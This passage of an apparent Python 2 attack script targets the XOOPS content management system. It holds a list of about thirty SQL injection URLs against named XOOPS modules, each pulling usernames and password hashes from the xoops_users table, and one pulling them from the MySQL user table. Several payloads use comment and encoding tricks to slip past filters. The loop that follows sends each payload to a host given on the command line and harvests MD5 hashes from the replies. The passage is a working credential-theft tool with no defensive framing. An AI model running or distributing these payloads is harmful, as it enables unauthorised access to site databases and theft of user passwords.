			"modules/friendfinder/view.php?id=-1'%20union%20select%201,2,3,4,5,6,7,8,concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20from%20xoops_users%20where%20uid%20like%201/*",
			"modules/myads/index.php?pa=view&cid=-1%20union%20select%201,concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass),3%20from%20xoops_users/*",
			"modules/repository/viewcat.php?cid=111111%20union%20select%202,concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass)%20from%20xoops_users%20where%20uid%20like%201/*",
			"modules/core/viewcat.php?cid=99999%20union%20select%201,concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass)%20from%20xoops_users%20where%20uid%20like%201/*",
			"modules/core/viewcat.php?cid=98989898%20union%20select%201,concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass)%20from%20xoops_users%20where%20uid%20like%201/*",
			"modules/ecal/display.php?katid=-1%20union%20select%20concat(char(117,115,101,114,110,97,109,101,58),user,char(112,97,115,115,119,111,114,100,58),password),2%20from%20mysql.user/*",
			"modules/tinyevent/index.php?op=show&id=999999%20union%20select%201,2,3,4,concat(char(117,115,101,114,110,97,109,101,45,45),uname,char(112,97,115,115,119,111,114,100,45,45),pass)%20from%20xoops_users%20where%20uid%20like%201/*",
			"modules/kshop/product_details.php?id=9999999%20union%20select%201,2,concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass),4,5,6,7,8,0,0,0,0%20from%20xoops_users%20where%20uid%20like%201/*",
			"modules/camportail/show.php?op=showcam&camid=999999%20union%20select%201,2,3,4,5,concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass),7,8,9,1,02,3,4,5,6%20from%20xoops_users%20where%20uid%20like%201/*",
			"modules/myalbum/viewcat.php?cid=9999999%20union%20select%201111,concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass)%20from%20xoops_users%20where%20uid%20like%201/*",
			"modules/wfsection/print.php?articleid=9999999%20union%20select%201111,2222,3333,4444,concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass),6666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20from%20xoops_users%20where%20uid%20like%201/*",
			"modules/zmagazine/print.php?articleid=9999999%20union%20select%201,2,3,concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass),5,6,7,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20from%20xoops_users%20where%20uid%20like%201/*",
			"modules/rha7downloads/visit.php?cid=-1&lid=-1%20union%20select%20concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass),2%20from%20xoops_users%20where%20uid%20like%201/*",
			"modules/wflinks/viewcat.php?cid=-1%20union%20select%202,concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass)%20from%20xoops_users%20where%20uid%20like%201/*",
			"modules/jobs/index.php?pa=jobsview&cid=-1%20union%20select%203,concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass),1%20from%20xoops_users%20where%20uid%20like%201/*",
			"modules/flashgames/game.php?lid=-19/**/UNION/**/SELECT/**/0,1,pass,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18/**/FROM/**/xoops_users/**/LIMIT/**/1,1/*",
			"modules/wfquotes/index.php?op=cat&c=1/**/UNION/**/SELECT/**/0,uname,pass,3,4,5/**/FROM/**/xoops_users/**/LIMIT/**/1,1/*",
			"modules/glossaire/glossaire-p-f.php?op=ImprDef&sid=999999%20union%20select%20concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass),2,3%20from%20xoops_users%20where%20uid%20like%201/*",
			"modules/myconference/index.php?sid=-1%20union%20select%20concat(char(117,115,101,114,110,97,109,101,58),uname,char(112,97,115,115,119,111,114,100,58),pass,char(98,105,116,101,114))%20from%20xoops_users%20where%20uid%20like%201/*",
			"modules/myTopics/print.php?articleid=-9999999/**/union/**/select+1,char(112,115,101,114),0,concat(uname,0x3a,pass),0,char(117,115,101,114,110,97,109,101,58),0,0,0,0,1,1,1,1,1,1,1,1,1,1,0,0,111,333,222,0,0,0,0/**/from%2F%2A%2A%2Fxoops_users/*%20where%20admin%201%200%201%20",
			"modules/eEmpregos/index.php?pa=view&cid=-00000000%2F%2A%2A%2Funion%2F%2A%2A%2Fselect+0,1,concat(uname,0x3a,pass)/**/from%2F%2A%2A%2Fxoops_users/*/*where%20admin%201=%202",
			"modules/classifieds/index.php?pa=Adsview&cid=-00000%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/0x3a,0x3a,concat(uname,0x3a,pass)/**/from+xoops_users/*where%20admin%20-1",
			"modules/glossaires/glossaires-p-f.php?op=ImprDef&sid=99999/**/union/**/select/**/000,pass,uname,pass/**/from/**/xoops_users/*where%20terme",
			"modules/wfdownloads/viewcat.php?cid=999%2F%2A%2A%2Funion%2F%2A%2A%2Fselect+000,concat(uname,0x3a,pass)/**/from%2F%2A%2A%2Fxoops_users/*where%20pass",
			"modules/gallery/index.php?do=showgall&gid=-9999999/**/union/**/select/**/0,1,concat(uname,0x3a,pass),3,4,5,6/**/from/**/xoops_users/*",
			"modules/tutorials/printpage.php?tid=-9999999/**/union/**/select/**/concat(uname,0x3a,pass),1,concat(uname,0x3a,pass),3,4,5/**/from/**/xoops_users/*",
			"modules/tutorials/index.php?op=printpage&tid=-9999999/**/union/**/select/**/0,1,concat(uname,0x3a,pass),3/**/from/**/xoops_users/*",
			"modules/my_egallery/index.php?do=showgall&gid=-9999999/**/union/**/select/**/0,1,concat(uname,0x3a,pass),3,4,5,6/**/from+xoops_users/*",
			"modules/dictionary/print.php?id=-9999999/**/union/**/select/**/concat(uname,0x3a,pass),concat(uname,0x3a,pass)/**/from/**/xoops_users/*",
			"modules/my_egallery/index.php?do=showgall&gid=-9999999/**/union/**/select/**/0,1,concat(uname,0x3a,pass),3,4,5,6/**/from+xoops_users/*"]
		host = sys.argv[1].replace("/index.php", "")
		if host[-1] != "/":
			host = host+"/"
		if host[:7] != "http://":
			host = "http://"+host
		print "\n[+] Site:",host
		print "[+] SQL Loaded:",len(sqls) 
		print "[+] Starting Scan...\n" 
		for sql in sqls:
			time.sleep(3) #Change this if needed
			#print "[+] Trying:",host+sql.replace("\n","")
			try:
				source = urllib2.urlopen(host+sql.replace("\n","")).read()
				md5s = re.findall("[a-f0-9]"*32,source)
				if len(md5s) >= 1:
					print "[!]",host+sql.replace("\n","")
					for md5 in md5s:
						print "\n[+]MD5:",md5
			except(urllib2.HTTPError):
				pass
		print "\n[-] Done\n"
		sys.exit(1)
